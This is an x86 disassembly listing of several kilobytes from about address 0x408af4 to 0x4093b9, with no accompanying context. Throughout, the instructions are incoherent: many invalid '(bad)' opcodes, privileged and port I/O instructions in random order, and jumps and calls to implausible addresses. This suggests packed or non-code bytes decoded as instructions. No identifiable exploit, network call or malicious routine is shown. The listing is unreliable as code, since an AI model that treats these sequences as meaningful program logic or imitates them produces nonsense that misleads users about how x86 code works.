  408af4:	xchg   esi,eax
  408af5:	test   DWORD PTR [edx+edi*4+0x70fc5bf0],ebx
  408afc:	jbe    0x408b44
  408afe:	mov    WORD PTR [edx+0x7d],?
  408b01:	dec    esi
  408b02:	test   BYTE PTR [eax+0x66],al
  408b05:	shl    BYTE PTR [ebp+ebp*1-0x5e],1
  408b09:	xchg   edi,eax
  408b0a:	je     0x408b4c
  408b0c:	push   esi
  408b0d:	nop
  408b0e:	jnp    0x408b48
  408b10:	dec    esi
  408b11:	inc    esi
  408b12:	fs mov edx,0x710e5bf0
  408b18:	ds inc esi
  408b1a:	push   esp
  408b1b:	jp     0x408b1d
  408b1d:	adc    DWORD PTR [ebp-0xcd100c0],ebx
  408b23:	sub    bh,dh
  408b25:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408b27:	inc    eax
  408b28:	jne    0x408b1b
  408b2a:	cwde   
  408b2b:	mov    dl,0xab
  408b2d:	push   ss
  408b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b2f:	inc    eax
  408b30:	mov    ch,0x9
  408b32:	xchg   ebp,eax
  408b33:	inc    eax
  408b34:	inc    DWORD PTR [esi]
  408b36:	xor    ecx,DWORD PTR [eax]
  408b38:	call   0xff80780d
  408b3d:	neg    ah
  408b3f:	sub    bh,dh
  408b41:	out    dx,al
  408b42:	sahf   
  408b43:	sub    eax,0x40a69695
  408b48:	call   DWORD PTR [ebx+ebx*4-0x702900c8]
  408b4f:	mov    ebp,DWORD PTR [edi+0xce]
	...
  408b61:	sahf   
  408b62:	inc    eax
  408b63:	mov    ch,0xd1
  408b65:	cs inc eax
  408b67:	call   ecx
  408b69:	sahf   
  408b6a:	outs   dx,BYTE PTR ds:[esi]
  408b6b:	push   DWORD PTR [esi-0x490f85da]
  408b71:	push   ds
  408b72:	inc    eax
  408b73:	call   0xff806195
  408b78:	sahf   
  408b79:	hlt    
  408b7a:	aaa    
  408b7b:	jmp    0xff80b0ab
  408b80:	mov    ss,WORD PTR [ebx+edi*1+0x4e047e8]
  408b87:	add    BYTE PTR [eax+0x1c000d21],dh
  408b8d:	or     dh,BYTE PTR [ecx]
  408b8f:	and    DWORD PTR [ebp-0xa8abfcd],0x18
  408b96:	xlat   BYTE PTR ds:[ebx]
  408b97:	jg     0x408b82
  408b99:	pusha  
  408b9a:	mov    es,WORD PTR [ebp+0x51]
  408b9d:	es mov edx,0x6ebd41f7
  408ba3:	inc    DWORD PTR [eax]
  408ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ba6:	mov    edx,0x4e95fc44
  408bab:	sti    
  408bac:	dec    DWORD PTR [edi]
  408bae:	retf   
  408baf:	(bad)  
  408bb0:	jne    0x408bd8
  408bb2:	fist   DWORD PTR [esi]
  408bb4:	mov    ebx,0xc00ac885
  408bb9:	into   
  408bba:	or     BYTE PTR [ecx-0xa4b1bb],cl
  408bc0:	mov    edi,?
  408bc2:	into   
  408bc3:	dec    edi
  408bc4:	inc    DWORD PTR [eax]
	...
  408bd2:	add    BYTE PTR [eax],al
  408bd4:	lahf   
  408bd5:	(bad)  
  408bd6:	out    0x7b,eax
  408bd8:	outs   dx,BYTE PTR ds:[esi]
  408bd9:	enter  0xbfe,0x3a
  408bdd:	push   ebp
  408bde:	sub    BYTE PTR [eax-0x6],ch
  408be1:	xor    ch,dh
  408be3:	mov    esi,0xe8075005
  408be8:	jecxz  0x408b87
  408bea:	(bad)  
  408beb:	call   DWORD PTR ds:0x8ffff750
  408bf1:	cmp    eax,0xdad275fe
  408bf6:	shr    BYTE PTR [ebx+0x75feca15],0xe
  408bfd:	retf   0xfc74
  408c00:	cmc    
  408c01:	dec    edi
  408c02:	pop    es
  408c03:	call   0x402921
  408c08:	aad    0x4f
  408c0a:	sti    
  408c0b:	call   0x4024f6
  408c10:	add    eax,ebp
  408c12:	pop    es
  408c13:	add    BYTE PTR [edi-0x44],bh
  408c16:	jmp    0x408b9b
  408c18:	mov    esi,0x8fff55da
  408c1d:	ss out 0xad,eax
  408c20:	dec    ecx
  408c21:	leave  
  408c22:	dec    BYTE PTR [ebx]
  408c24:	dec    edx
  408c25:	dec    edi
  408c26:	add    al,0x5e
  408c28:	xor    eax,esp
  408c2a:	pop    es
  408c2b:	add    BYTE PTR [ebx-0x57],ah
  408c2e:	mov    ebp,0xcdcf13ef
  408c33:	or     ecx,DWORD PTR [ebx+0x67]
  408c36:	(bad)  
  408c37:	inc    DWORD PTR [eax]
	...
  408c45:	add    BYTE PTR [eax],al
  408c47:	push   esp
  408c48:	xor    eax,DWORD PTR [ebx+0xf]
  408c4b:	out    0xd1,eax
  408c4d:	add    al,BYTE PTR [eax]
  408c4f:	arpl   di,bp
  408c51:	int    0xfb
  408c53:	dec    ebx
  408c54:	repz xchg esp,eax
  408c56:	push   DWORD PTR [esi*4-0x5ed31443]
  408c5d:	inc    edi
  408c5e:	jmp    FWORD PTR [esi+0x1b754340]
  408c64:	adc    al,0x52
  408c66:	scas   al,BYTE PTR es:[edi]
  408c67:	adc    al,0x3f
  408c69:	ja     0x408ce0
  408c6b:	inc    DWORD PTR [edx]
  408c6d:	mov    edx,0xc273f467
  408c72:	call   DWORD PTR [esi+0x6380c554]
  408c78:	sub    al,0xe
  408c7a:	shl    BYTE PTR [esi+0x2a],0x2e
  408c7e:	cmp    eax,0xeeac5bd8
  408c83:	fwait
  408c84:	in     eax,dx
  408c85:	add    ebp,eax
  408c87:	fdivp  st(6),st
  408c89:	add    eax,DWORD PTR [eax]
  408c8b:	pusha  
  408c8c:	jl     0x408c1b
  408c8e:	jne    0x408c4b
  408c90:	ret    
  408c91:	inc    ecx
  408c92:	cmp    BYTE PTR [edx],ah
  408c94:	sub    al,0xd9
  408c96:	out    0x54,eax
  408c98:	lods   eax,DWORD PTR ds:[esi]
  408c99:	add    eax,DWORD PTR [eax]
  408c9b:	pop    eax
  408c9c:	ins    BYTE PTR es:[edi],dx
  408c9d:	mov    ecx,0x8d32b801
  408ca2:	adc    BYTE PTR [ebp+0x3150032b],ah
  408ca8:	mov    edi,0xe7b8
	...
  408cb9:	add    BYTE PTR [eax+eax*2-0x527517f5],cl
  408cc0:	inc    edx
  408cc1:	call   FWORD PTR [ecx]
  408cc3:	add    eax,0x85538bc1
  408cc8:	pop    ds
  408cc9:	add    al,0xf6
  408ccb:	jb     0x408c8e
  408ccd:	add    al,0x53
  408ccf:	pop    DWORD PTR cs:[ebx-0x2a]
  408cd3:	or     eax,0x3d095051
  408cd8:	ds inc ebx
  408cda:	(bad)  
  408cdb:	cmp    DWORD PTR [esi],esi
  408cdd:	mov    ecx,0xbb43d38
  408ce2:	dec    ebx
  408ce3:	xor    dl,BYTE PTR [ebx+0x43]
  408ce6:	xor    al,0x3d
  408ce8:	xchg   esp,eax
  408ce9:	das    
  408cea:	cmp    ebp,ebx
  408cec:	inc    esi
  408ced:	inc    ebx
  408cee:	and    al,0x8b
  408cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cf1:	xor    esi,DWORD PTR [ebx+0x14779a2d]
  408cf7:	cmp    eax,0x4ead0412
  408cfc:	sub    ecx,DWORD PTR [ebx+eiz*2]
  408cff:	shl    BYTE PTR [ecx+0x30],cl
  408d02:	loopne 0x408d45
  408d04:	in     eax,0xad
  408d06:	hlt    
  408d07:	scas   al,BYTE PTR es:[edi]
  408d08:	repz inc edx
  408d0a:	jbe    0x408d19
  408d0c:	rol    esi,0xb9
  408d0f:	cmp    al,0xce
  408d11:	mov    WORD PTR [esi],fs
  408d13:	cmp    DWORD PTR [ecx+0x7f],edx
  408d16:	fwait
  408d17:	(bad)  
  408d18:	call   0xc14de35f
  408d1d:	push   0x0
	...
  408d2b:	add    BYTE PTR [eax],al
  408d2d:	(bad)  
  408d2e:	cmp    al,0xae
  408d30:	lods   eax,DWORD PTR ds:[esi]
  408d31:	mov    esp,0x23fcfba4
  408d36:	add    eax,0xc66a0511
  408d3b:	call   0xc012fb82
  408d40:	les    ebx,FWORD PTR [esp+0x3c947385]
  408d47:	repnz inc ebx
  408d49:	pop    ss
  408d4a:	pop    ds
  408d4b:	add    BYTE PTR [ecx],al
  408d4d:	cmp    edi,ebp
  408d4f:	inc    eax
  408d50:	jmp    0x9908b1e5
  408d55:	and    DWORD PTR [eax+edx*2],edi
  408d58:	mov    ecx,0x4107b221
  408d5d:	cmp    eax,0x884eff3b
  408d62:	inc    ebx
  408d63:	lods   eax,DWORD PTR ds:[esi]
  408d64:	inc    esi
  408d65:	mov    eax,ds:0x725119af
  408d6a:	ja     0x408d6b
  408d6c:	ss push ebp
  408d6e:	inc    ebp
  408d6f:	je     0x408d75
  408d71:	andps  xmm7,XMMWORD PTR [eax]
  408d74:	test   al,0x60
  408d76:	aad    0xe7
  408d78:	dec    edx
  408d79:	mov    bh,0x3c
  408d7b:	inc    DWORD PTR [ecx-0x16bf0284]
  408d81:	xor    BYTE PTR [eax+ebx*4],ah
  408d84:	cmp    BYTE PTR [ecx-0x5e66afc4],ah
  408d8a:	mov    dl,0x7
  408d8c:	add    DWORD PTR [ebp+0xeeff3b],ecx
	...
  408d9e:	add    BYTE PTR [eax],al
  408da0:	dec    ecx
  408da1:	xchg   ebx,eax
  408da2:	lods   eax,DWORD PTR ds:[esi]
  408da3:	out    0xa2,al
  408da5:	scas   eax,DWORD PTR es:[edi]
  408da6:	sbb    edx,ecx
  408da8:	xor    DWORD PTR [esi-0x1],0x744556d6
  408daf:	add    al,0xf
  408db1:	push   esp
  408db2:	cmp    BYTE PTR [eax],ch
  408db4:	pop    edi
  408db5:	aad    0xe7
  408db7:	cmp    dl,BYTE PTR [eax+0x3c]
  408dba:	inc    DWORD PTR [ecx+0x7b]
  408dbd:	std    
  408dbe:	inc    eax
  408dbf:	jmp    0x58a8b154
  408dc4:	and    bh,BYTE PTR [eax+edx*2]
  408dc7:	cmp    DWORD PTR [edx],esp
  408dc9:	mov    dl,0x7
  408dcb:	sbb    esi,0x4f8eff3a
  408dd1:	mov    ds:0xc5dd00ac,eax
  408dd6:	imul   esp,DWORD PTR [ebx],0xffb0b6f2
  408ddc:	or     eax,0xa774c00a
  408de1:	outs   dx,DWORD PTR ds:[esi]
  408de2:	xlat   BYTE PTR ds:[ebx]
  408de3:	cmp    bl,cl
  408de5:	pop    es
  408de6:	push   eax
  408de7:	call   0x3f44a5
  408dec:	mov    ds:0x4a4137e3,al
  408df1:	push   edi
  408df2:	out    0x38,eax
  408df4:	fcmovnb st,st(4)
  408df6:	(bad)  
  408df7:	push   eax
  408df8:	jmp    0xfd50:0xa20874c5
  408dff:	dec    DWORD PTR [ebp+0xad35e9]
	...
  408e11:	add    BYTE PTR [eax],al
  408e13:	jge    0x408dd9
  408e15:	(bad)  
  408e16:	jne    0x408e66
  408e18:	les    esi,FWORD PTR [eax+ecx*1+0x62]
  408e1c:	scas   al,BYTE PTR es:[edi]
  408e1d:	test   eax,0xc1ce6dff
  408e22:	add    al,0xa
  408e24:	push   esp
  408e25:	mov    ch,ah
  408e27:	jnp    0x408df6
  408e29:	fcomi  st,st(7)
  408e2b:	or     eax,0xe458cc6
  408e30:	push   edi
  408e31:	(bad)  
  408e32:	jne    0x408e2e
  408e34:	lds    esi,FWORD PTR [esp+ecx*1+0x12]
  408e38:	jbe    0x408eb8
  408e3a:	add    dl,bh
  408e3c:	or     eax,eax
  408e3e:	cmova  eax,DWORD PTR [ecx+eax*1+0x44cdca00]
  408e46:	clc    
  408e47:	mov    edx,0xf5000006
  408e4c:	inc    ebx
  408e4d:	repz inc ebp
  408e50:	push   es
  408e51:	add    BYTE PTR [edx-0x36],ch
  408e54:	push   0x68ba69ff
  408e59:	dec    DWORD PTR [ebx+eiz*2-0x11afc817]
  408e60:	mov    eax,ds:0x8394f736
  408e65:	sar    esi,cl
  408e67:	push   ss
  408e68:	test   BYTE PTR [eax+0x75],al
  408e6b:	xchg   DWORD PTR [edx+eax*8+0xc2c637e],eax
  408e72:	shr    bh,0x28
  408e75:	sub    al,BYTE PTR [ecx+0x0]
	...
  408e83:	add    BYTE PTR [eax],al
  408e85:	add    BYTE PTR [edx+0x2c],ah
  408e88:	add    ebp,DWORD PTR [eax-0x63]
  408e8b:	add    al,0xc3
  408e8d:	call   FWORD PTR [ebp+0x51]
  408e90:	adc    ebp,eax
  408e92:	mov    edi,0xb3ff3fbc
  408e97:	mov    bh,0x52
  408e99:	(bad)  
  408e9a:	fdivrp st(7),st
  408e9c:	aaa    
  408e9d:	(bad)  
  408e9e:	cmp    al,0x9c
  408ea0:	aad    0xe7
  408ea2:	(bad)  
  408ea3:	fdivr  QWORD PTR [edi]
  408ea5:	(bad)  
  408ea6:	fisub  DWORD PTR [eax+0x1324f732]
  408eac:	sub    ebp,DWORD PTR [edx+0x6a400acf]
  408eb2:	arpl   WORD PTR [esi+esi*8+0x402ca238],dx
  408eb9:	mov    ch,0x13
  408ebb:	cmp    edi,DWORD PTR [edi]
  408ebd:	(bad)  
  408ebe:	cld    
  408ebf:	mov    al,0xe
  408ec1:	call   0xff80218c
  408ec6:	fisub  DWORD PTR [eax+0x52e4f727]
  408ecc:	stos   BYTE PTR es:[edi],al
  408ecd:	inc    DWORD PTR [edx+ecx*1-0x3]
  408ed1:	inc    eax
  408ed2:	arpl   WORD PTR [ebx+0x79],ax
  408ed5:	lock aam 0x7a
  408ed8:	aas    
  408ed9:	dec    DWORD PTR [esi+0x20]
  408edc:	sub    edx,DWORD PTR [edx-0x76c094f4]
  408ee2:	fiadd  WORD PTR [ecx+ecx*4]
  408ee5:	aaa    
  408ee6:	lods   al,BYTE PTR ds:[esi]
  408ee7:	cmp    DWORD PTR [ebx],edx
  408ee9:	add    al,0x0
	...
  408ef7:	add    BYTE PTR [eax],al
  408ef9:	cmp    esp,eax
  408efb:	iret   
  408efc:	les    ebx,FWORD PTR [edx+edi*1+0x398c3454]
  408f03:	xchg   BYTE PTR [edi],bh
  408f05:	push   ss
  408f06:	or     DWORD PTR [ecx+0x7639b5b7],edx
  408f0c:	(bad)  
  408f0d:	out    0x28,al
  408f0f:	jbe    0x408f50
  408f11:	je     0x408ec1
  408f13:	call   0xa83cc7c3
  408f18:	add    esp,DWORD PTR [edi+ebp*2+0x59]
  408f1c:	aaa    
  408f1d:	pop    esp
  408f1e:	cmp    DWORD PTR [esi-0x47],ecx
  408f21:	push   0x4c6ea52d
  408f26:	cmp    DWORD PTR [eax-0x77],esi
  408f29:	cmp    esi,DWORD PTR [ecx]
  408f2b:	ss aas 
  408f2d:	leave  
  408f2e:	add    eax,0xc67bcbc1
  408f33:	call   0x16768576
  408f38:	aas    
  408f39:	and    al,0x39
  408f3b:	pushf  
  408f3c:	ud2    
  408f3e:	(bad)  
  408f3f:	cmp    eax,0x6c8f143f
  408f44:	pusha  
  408f45:	adc    al,0x39
  408f47:	inc    BYTE PTR [edx+0x3efe21c6]
  408f4d:	cld    
  408f4e:	add    eax,0x7ae00c74
  408f53:	leave  
  408f54:	ss in  al,dx
  408f56:	cmp    cl,ch
  408f58:	mov    bh,0x7f
  408f5a:	test   BYTE PTR [edi+ebp*1+0x0],dl
	...
  408f69:	add    BYTE PTR [eax],al
  408f6b:	add    ah,dl
  408f6d:	cmp    dh,cl
  408f6f:	add    ecx,DWORD PTR [edi-0x27]
  408f72:	imul   eax,DWORD PTR [eax+0x3ebe30bb],0x19ffb163
  408f7c:	(bad)  
  408f7e:	(bad)  
  408f7f:	mov    esi,0xf1753836
  408f84:	js     0x408f42
  408f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f87:	sahf   
  408f88:	cmp    BYTE PTR gs:[ebp-0xc7aa7b],dh
  408f8f:	mov    ds,ebx
  408f91:	add    al,ch
  408f93:	mov    dh,0xf8
  408f95:	aaa    
  408f96:	(bad)  
  408f97:	jle    0x408fa4
  408f99:	sub    eax,0x383d76f7
  408f9e:	jne    0x408f81
  408fa0:	dec    eax
  408fa1:	inc    esi
  408fa2:	test   al,0x66
  408fa4:	sub    eax,0x2d45b538
  408fa9:	cmp    bh,bh
  408fab:	push   esi
  408fac:	sbb    eax,DWORD PTR [eax]
  408fae:	call   0xff79584d
  408fb3:	inc    esi
  408fb4:	retf   
  408fb5:	and    eax,0x38853ef7
  408fba:	jne    0x408f9d
  408fbc:	mov    BYTE PTR [edx-0x58],ah
  408fbf:	cs jne 0x408ffa
  408fc2:	mov    ch,0x45
  408fc4:	jne    0x408ffe
  408fc6:	call   FWORD PTR [esi]
  408fc8:	jmp    0x408fc9
  408fca:	out    0x7e,eax
  408fcc:	mov    BYTE PTR [eax],bh
  408fce:	dec    DWORD PTR [esi]
	...
  408fdc:	add    BYTE PTR [eax],al
  408fde:	add    BYTE PTR [ebx+0x4d06f721],bl
  408fe4:	sub    eax,0x384552a1
  408fe9:	(bad)  
  408fea:	cmp    al,0x40
  408fec:	xor    bh,bh
  408fee:	out    dx,al
  408fef:	dec    ecx
  408ff0:	(bad)  
  408ff1:	stos   DWORD PTR es:[edi],eax
  408ff2:	out    0x2e,al
  408ff4:	cmp    BYTE PTR [ebp-0xc7d133],dh
  408ffa:	shr    edx,0x6b
  408ffd:	dec    esi
  408fff:	xchg   esi,eax
  409000:	jb     0x408fea
  409002:	add    BYTE PTR ds:0x3ae8fefa,cl
  409008:	scas   al,BYTE PTR es:[edi]
  409009:	(bad)  
  40900a:	push   ebp
  40900c:	scas   eax,DWORD PTR es:[edi]
  40900d:	fcomi  st,st(7)
  40900f:	add    eax,0x1175e7fa
  409014:	cli    
  409015:	(bad)  
  409016:	dec    DWORD PTR [edi]
  409018:	icebp  
  409019:	idiv   bh
  40901b:	cmc    
  40901c:	stc    
  40901d:	je     0x40902b
  40901f:	in     eax,0x6f
  409021:	pop    es
  409022:	call   0x3f89ce
  409027:	add    eax,0xf5f7efb0
  40902c:	stc    
  40902d:	out    0x59,eax
  40902f:	and    edx,edi
  409031:	(bad)  
  409032:	(bad)  
  409033:	mov    edi,0x451e8fb
  409038:	cli    
  409039:	(bad)  
  40903a:	(bad)  
  40903b:	aas    
  40903c:	mul    edi
  40903e:	mov    ds:0xc9000327,eax
	...
  40904f:	add    BYTE PTR [eax],al
  409051:	add    BYTE PTR [eax+0x15],bh
  409054:	add    BYTE PTR [ebp-0x2f],dl
  409057:	cmc    
  409058:	add    ah,0x76
  40905b:	imul   edi,edi,0x69
  40905e:	or     al,0xfa
  409060:	je     0x40906a
  409062:	push   edx
  409063:	ins    BYTE PTR es:[edi],dx
  409064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409065:	inc    DWORD PTR [ebp-0x76]
  409068:	inc    ebp
  409069:	cld    
  40906a:	loop   0x4090c0
  40906c:	cmp    BYTE PTR [ecx+0xa],al
  40906f:	imul   eax,DWORD PTR [ecx],0x0
  409072:	cli    
  409073:	cmp    bh,0x75
  409076:	adc    ch,bl
  409078:	idiv   ch
  40907a:	cmc    
  40907b:	stc    
  40907c:	addr16 push edx
  40907e:	mov    bl,0x43
  409080:	(bad)  
  409081:	dec    BYTE PTR [edi+0x4e]
  409084:	sub    BYTE PTR [ecx-0x6],al
  409087:	stc    
  409088:	je     0x409092
  40908a:	arpl   WORD PTR [edi+eiz*1-0x3],ax
  40908e:	aam    0x47
  409090:	cmp    al,0x75
  409092:	iret   
  409093:	aas    
  409094:	mov    dh,0x7
  409096:	mov    ebx,0xbcff6bf6
  40909b:	gs inc ecx
  40909d:	add    al,0x63
  40909f:	adc    DWORD PTR [ecx+0x5f68e2ec],ecx
  4090a5:	mul    DWORD PTR [edi+edx*4-0x360ba72]
  4090ac:	cmp    al,0x75
  4090ae:	jae    0x409037
  4090b0:	mov    dh,0xb
  4090b2:	jnp    0x40909c
  4090b4:	mov    esi,0xff
	...
  4090c5:	test   BYTE PTR [ebx],dh
  4090c7:	inc    ebx
  4090c8:	(bad)  
  4090ca:	out    dx,al
  4090cb:	add    DWORD PTR [eax],eax
  4090cd:	arpl   WORD PTR [edi-0x3a],bx
  4090d0:	mul    DWORD PTR [ebx+0x2c]
  4090d3:	add    eax,DWORD PTR [eax]
  4090d5:	pushf  
  4090d6:	popa   
  4090d7:	aaa    
  4090d8:	jmp    DWORD PTR [esp+ebp*1+0x3]
  4090dc:	push   0x63
  4090de:	inc    edx
  4090df:	add    ebp,DWORD PTR [edx+0x63]
  4090e2:	push   edx
  4090e3:	add    ecx,DWORD PTR [ebp-0x732d0f62]
  4090e9:	out    0xf7,al
  4090eb:	xor    edi,edi
  4090ed:	xor    al,0x9c
  4090ef:	cmp    al,0x75
  4090f1:	sub    ebx,edi
  4090f3:	mov    ch,0xfb
  4090f5:	cmp    ebp,DWORD PTR [esi]
  4090f7:	mov    esi,0x43231cff
  4090fc:	je     0x40915c
  4090fe:	add    eax,0x2c630182
  409103:	stos   DWORD PTR es:[edi],eax
  409104:	lds    edi,FWORD PTR [ebx]
  409106:	ins    DWORD PTR es:[edi],dx
  409107:	add    edi,edi
  409109:	jbe    0x409167
  40910b:	sub    edi,DWORD PTR [ecx]
  40910d:	lds    esp,FWORD PTR [esi]
  40910f:	cmp    edx,DWORD PTR [eax-0x28]
  409112:	add    al,0xb9
  409114:	mov    esi,ebx
  409116:	xor    dh,dl
  409118:	cmp    ebx,esp
  40911a:	aam    0x3a
  40911c:	sub    al,0x8a
  40911e:	addr16 into 
  409120:	cmp    ebx,edx
  409122:	jg     0x4090dd
  409124:	xor    eax,esp
  409126:	xor    eax,0xbbd1
	...
  409137:	add    BYTE PTR [edx],cl
  409139:	ss mov dh,0xae
  40913c:	mov    ah,0x9d
  40913e:	push   ebx
  40913f:	std    
  409140:	and    eax,DWORD PTR ds:0x2db371a6
  409146:	sahf   
  409147:	cmp    ebx,DWORD PTR [edi+ebp*4+0x67e12be4]
  40914e:	mov    ?,WORD PTR [ebx]
  409150:	fidivr DWORD PTR [edi-0x73]
  409153:	xor    eax,DWORD PTR [ebp+esi*1+0x640b0413]
  40915a:	mov    al,0xc4
  40915c:	je     0x409194
  40915e:	xor    al,0x34
  409160:	je     0x409197
  409162:	cmp    bp,si
  409165:	or     BYTE PTR [ecx-0x5d],dl
  409168:	sysexit 
  40916a:	push   esi
  40916b:	(bad)  
  40916c:	fisub  WORD PTR ds:0xa04c3b56
  409172:	call   0xa82f5722
  409177:	add    edi,DWORD PTR [ebx+edi*2]
  40917a:	cmp    DWORD PTR [ebx],esi
  40917c:	xor    al,0x35
  40917e:	cs mov cl,0x58
  409181:	sbb    eax,0x352468b5
  409186:	jo     0x409109
  409188:	(bad)  
  40918a:	push   ss
  40918b:	cmp    ecx,DWORD PTR [ecx+0x4a8c8105]
  409191:	(bad)  
  409192:	call   0xf6765fd1
  409197:	cmp    bh,ah
  409199:	xor    al,0x0
  40919b:	jl     0x40919d
	...
  4091a9:	add    BYTE PTR [eax],al
  4091ab:	pop    esp
  4091ac:	sbb    eax,0x34283c31
  4091b1:	mov    DWORD PTR [eax+edi*1+0x3c],ebp
  4091b5:	(bad)  
  4091b6:	fimul  WORD PTR [esi]
  4091b8:	xor    eax,0xc5d78767
  4091bd:	dec    ebp
  4091bf:	push   ebx
  4091c0:	xor    eax,0x3489c6f7
  4091c5:	jne    0x4091b4
  4091c7:	mov    BYTE PTR [ebx],bl
  4091c9:	lods   eax,DWORD PTR ds:[esi]
  4091ca:	mov    dh,0x79
  4091cc:	jle    0x409153
  4091ce:	lea    esi,[ecx+0x34]
  4091d1:	jmp    FWORD PTR [edx+0x2b]
  4091d4:	sub    edi,esi
  4091d6:	sahf   
  4091d7:	pop    ecx
  4091d8:	add    eax,0x72dde075
  4091dd:	loopne 0x409175
  4091df:	dec    ecx
  4091e0:	xor    al,0x0
  4091e2:	std    
  4091e3:	ret    
  4091e4:	xchg   DWORD PTR [ebp-0xcbce73],edi
  4091ea:	jmp    0x2cc362b3
  4091ef:	cmp    BYTE PTR [edi+edi*8],bh
  4091f2:	pushaw 
  4091f4:	mov    ecx,0x560d152
  4091f9:	out    dx,eax
  4091fa:	xchg   edi,eax
  4091fb:	cdq    
  4091fc:	mov    edx,0x6a304107
  409201:	inc    DWORD PTR [esi-0x77]
  409204:	jp     0x4091f2
  409206:	ss jns 0x40923d
  409209:	(bad)  
  40920a:	mov    esp,0x87a41d68
	...
  40921b:	add    BYTE PTR [eax],al
  40921d:	add    BYTE PTR [ecx+0x34],ch
  409220:	call   FWORD PTR [eax+edi*2+0x3c]
  409224:	call   FWORD PTR [esi]
  409226:	pop    ecx
  409227:	mov    edx,0x6af20107
  40922c:	dec    DWORD PTR [esi]
  40922e:	dec    ecx
  40922f:	jp     0x409215
  409231:	add    BYTE PTR ds:0x77fffeee,al
  409237:	add    al,ch
  409239:	mov    BYTE PTR [edi+ebp*8-0x17c80002],ah
  409240:	idiv   bh
  409242:	std    
  409243:	in     eax,dx
  409244:	je     0x40924e
  409246:	mov    dl,0x72
  409248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409249:	jmp    FWORD PTR [ebp-0x4a234b13]
  40924f:	in     eax,dx
  409250:	(bad)  
  409251:	inc    DWORD PTR [edi-0x1b9317ff]
  409257:	in     eax,dx
  409258:	(bad)  
  409259:	push   DWORD PTR [edi]
  40925b:	in     eax,0xf6
  40925d:	(bad)  
  40925e:	std    
  40925f:	loopne 0x4092d6
  409261:	test   eax,0xb5feedfd
  409266:	jmp    0xa861:0xe2fffef5
  40926d:	(bad)  
  40926e:	fucomp st(5)
  409270:	mov    ah,0xec
  409272:	add    eax,0x6ae8feee
  409277:	mov    al,ds:0xa3edfffe
  40927c:	out    0xf7,eax
  40927e:	std    
  40927f:	in     eax,dx
  409280:	out    0x55,eax
	...
  40928e:	add    BYTE PTR [eax],al
  409290:	add    bl,dl
  409292:	in     eax,dx
  409293:	(bad)  
  409294:	push   edi
  409296:	int    0xf6
  409298:	jmp    FWORD PTR [ebp-0x6256b61f]
  40929e:	in     al,dx
  40929f:	(bad)  
  4092a0:	mov    ch,0x8a
  4092a2:	hlt    
  4092a3:	(bad)  
  4092a4:	(bad)  
  4092a5:	jge    0x409309
  4092a7:	or     edi,edi
  4092a9:	idiv   esi
  4092ab:	out    0x3d,eax
  4092ad:	jl     0x40929b
  4092af:	(bad)  
  4092b0:	inc    DWORD PTR [edi+0x7dfff6f9]
  4092b6:	loope  0x4092e5
  4092b8:	test   eax,0xff391b63
  4092bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092be:	adc    al,0x2b
  4092c0:	push   ecx
  4092c1:	add    eax,0x76ff390c
  4092c6:	xor    BYTE PTR [ebx],ch
  4092c8:	js     0x409342
  4092ca:	sbb    al,0x3
  4092cc:	leave  
  4092cd:	and    DWORD PTR [ecx+0x3],edx
  4092d0:	push   ebp
  4092d1:	fcomp  DWORD PTR [eax-0x7c]
  4092d4:	(bad)  
  4092d5:	(bad)  
  4092d7:	add    ebp,DWORD PTR [edx+0x6c]
  4092da:	pop    ebx
  4092db:	scas   al,BYTE PTR es:[edi]
  4092dc:	pop    es
  4092dd:	mov    ebx,0xc4ff61dc
  4092e2:	mov    ch,0xbd
  4092e4:	sti    
  4092e5:	dec    ebx
  4092e6:	xchg   edx,edi
  4092e8:	inc    eax
  4092e9:	arpl   WORD PTR [ebx-0x12],di
  4092ec:	push   esp
  4092ed:	jp     0x4092cc
  4092ef:	add    edi,edi
  4092f1:	cs xor al,0x2b
  4092f4:	test   BYTE PTR [eax],0x0
	...
  409303:	add    BYTE PTR [esi-0x2797c76d],bl
  409309:	push   ebp
  40930a:	ret    0x4ff
  40930d:	push   ds
  40930e:	add    eax,DWORD PTR [eax]
  409310:	jecxz  0x40929d
  409312:	scas   al,BYTE PTR es:[edi]
  409313:	pop    es
  409314:	mov    ecx,DWORD PTR [eax-0x448b00ca]
  40931a:	lods   eax,DWORD PTR ds:[esi]
  40931b:	sti    
  40931c:	ins    BYTE PTR es:[edi],dx
  40931d:	cmp    DWORD PTR [ebx],ecx
  40931f:	call   0xff791534
  409324:	sub    bl,dh
  409326:	(bad)  
  409327:	jmp    FWORD PTR [edi+0x278126a7]
  40932d:	lock das 
  40932f:	inc    DWORD PTR [ecx+edi*4-0x43]
  409333:	sti    
  409334:	xchg   ebx,eax
  409335:	rep lods eax,DWORD PTR ds:[esi]
  409337:	sysenter 
  409339:	jno    0x409342
  40933b:	call   0x440a8a
  409340:	pop    eax
  409341:	add    eax,0x81e60829
  409346:	jmp    0xac8af64e
  40934b:	cmp    esp,DWORD PTR [ebx+0x5]
  40934e:	jmp    0xfd08af56
  409353:	aaa    
  409354:	fs add eax,0x9bf4ade9
  40935a:	call   0xe8dc800c
  40935f:	xchg   BYTE PTR [esi-0x1976c6c7],bl
  409365:	cmp    dh,dl
  409367:	aaa    
	...
  409374:	add    BYTE PTR [eax],al
  409376:	add    ah,dl
  409378:	aam    0xd5
  40937a:	mov    cl,0xd4
  40937c:	xor    DWORD PTR [eax+edi*1-0x45],edx
  409380:	das    
  409381:	inc    ebx
  409382:	add    al,0x63
  409384:	(bad)  
  409385:	test   al,0xb0
  409387:	bound  ebx,QWORD PTR [esi]
  409389:	sbb    al,0x89
  40938b:	out    0x20,al
  40938d:	mov    dh,0x37
  40938f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409390:	aam    0x73
  409392:	adc    DWORD PTR [edi+0x33379e39],0x8c141c32
  40939c:	mov    bh,0xdc
  40939e:	sub    eax,DWORD PTR ds:0xea37865e
  4093a4:	xchg   DWORD PTR [ecx+0x2f],edi
  4093a7:	je     0x4093da
  4093a9:	loop   0x4093ee
  4093ab:	mul    esi
  4093ad:	imul   edi,DWORD PTR [ecx+0x77],0x63376639
  4093b4:	mov    ecx,0x3154abff
  4093b9:	inc    esi
